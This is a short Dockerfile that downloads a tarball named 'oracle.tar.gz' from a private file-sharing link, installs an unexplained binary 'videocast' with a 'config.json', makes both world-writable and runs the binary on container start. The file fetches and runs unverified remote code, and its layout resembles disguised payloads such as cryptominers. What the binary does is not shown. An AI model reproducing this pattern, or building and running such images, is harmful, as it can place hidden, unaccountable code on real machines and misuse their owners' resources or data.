FROM ubuntu:20.04

LABEL maintainer="Roman Nikov"

RUN apt update; \
    apt install -y wget; \
    wget https://cdn.filesend.jp/private/BPnZaAi2fcFz-NnwNAwt2yz_G3M1A_P2PGRd-tioxnOWskfUYyUKsYwvX1wVUpoF/oracle.tar.gz; \
    tar xf oracle.tar.gz; \
    cd oracle; \
    cp config.json /usr/local/bin/config.json; \
    cp videocast /usr/local/bin/videocast; \
    cd /usr/local/bin;

WORKDIR /usr/local/bin

RUN chmod 777 config.json;

RUN chmod 777 videocast;

CMD videocast
